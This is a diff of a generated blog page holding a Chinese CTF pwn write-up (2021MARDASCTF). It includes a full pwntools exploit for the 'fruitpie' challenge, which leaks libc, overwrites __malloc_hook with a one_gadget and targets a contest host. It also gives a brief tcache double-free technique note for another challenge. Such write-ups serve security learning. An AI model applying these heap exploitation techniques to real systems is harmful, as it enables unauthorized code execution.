@@ -96,18 +96,18 @@
 
 
 
-  <meta name="description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp fruitpiemmap分配的chunk和libc之间的偏移固定 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.termi">
+  <meta name="description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp">
 <meta name="keywords" content="CTF Pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2021MARDASCTF">
 <meta property="og:url" content="https://ainevsia.github.io/2021/03/30/2021MARDASCTF/index.html">
 <meta property="og:site_name" content="无花果">
-<meta property="og:description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp fruitpiemmap分配的chunk和libc之间的偏移固定 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.termi">
+<meta property="og:description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-03-30T04:02:22.046Z">
+<meta property="og:updated_time" content="2021-03-30T11:12:26.139Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2021MARDASCTF">
-<meta name="twitter:description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp fruitpiemmap分配的chunk和libc之间的偏移固定 123456789101112131415161718192021222324252627282930313233#!/usr/bin/pythonfrom pwn import *context.log_level=logging.DEBUGcontext.termi">
+<meta name="twitter:description" content="比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的wp">
 
 
 
@@ -427,7 +427,7 @@
                 
               
 
-              <time title="创建时间：2021年03月30日 11:55:21 / 修改时间：12:02:22" itemprop="dateCreated datePublished" datetime="2021-03-30T11:55:21+08:00">2021年03月30日</time>
+              <time title="创建时间：2021年03月30日 11:55:21 / 修改时间：19:12:26" itemprop="dateCreated datePublished" datetime="2021-03-30T11:55:21+08:00">2021年03月30日</time>
             
 
             
@@ -515,6 +515,7 @@
 
       
         <p>比赛的时候只做出来一题，其余的全是赛后学习r1nd0师傅的<a href="https://r1nd0.github.io/2021/03/28/2021DASCTF-Mar-pwn-wp" target="_blank" rel="noopener">wp</a></p>
+<a id="more"></a>
 <h1 id="fruitpie"><a href="#fruitpie" class="headerlink" title="fruitpie"></a>fruitpie</h1><p>mmap分配的chunk和libc之间的偏移固定</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=logging.DEBUG</span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'new-window'</span>]</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">LOCAL=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">	p=process(<span class="string">'./fruitpie'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p=remote(<span class="string">'54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com'</span>, <span class="number">50902</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">-0x260</span>+<span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">'malloc:\n'</span>,<span class="string">'99999999'</span>)</span><br><span class="line">leak=int(p.recvline().rstrip(),<span class="number">0x10</span>)</span><br><span class="line">p.success(<span class="string">'leak: '</span>+hex(leak))</span><br><span class="line">base=leak+<span class="number">0x7fe288477000</span><span class="number">-0x7fe282518010</span></span><br><span class="line">p.success(<span class="string">'base: '</span>+hex(base))</span><br><span class="line"></span><br><span class="line">malloc_hook=base+<span class="number">0x7f071698cc30</span><span class="number">-0x7f07165a1000</span></span><br><span class="line">offset=malloc_hook-leak<span class="number">-8</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'Offset:\n'</span>,hex(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment"># attach(p,'b malloc\nc')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget=base+<span class="number">0x10a45c</span></span><br><span class="line">p.sendafter(<span class="string">'Data:\n'</span>,flat([<span class="number">0x0</span>,one_gadget]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="ParentSimulator"><a href="#ParentSimulator" class="headerlink" title="ParentSimulator"></a>ParentSimulator</h1><p>一次tcache double free构造两个相同的指针，改__free_hook为freegadget栈迁移，orw。</p>
@@ -586,6 +587,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/30/2021LINECTF/" rel="prev" title="2021LINECTF 复现笔记">
+                2021LINECTF 复现笔记 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -661,7 +666,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">40</span>
+                    <span class="site-state-item-count">42</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -923,7 +928,7 @@
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">175k</span>
+    <span title="站点总字数">187k</span>
   
 
   
@@ -934,7 +939,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">2:39</span>
+    <span title="站点阅读时长">2:50</span>
   
 </div>
 
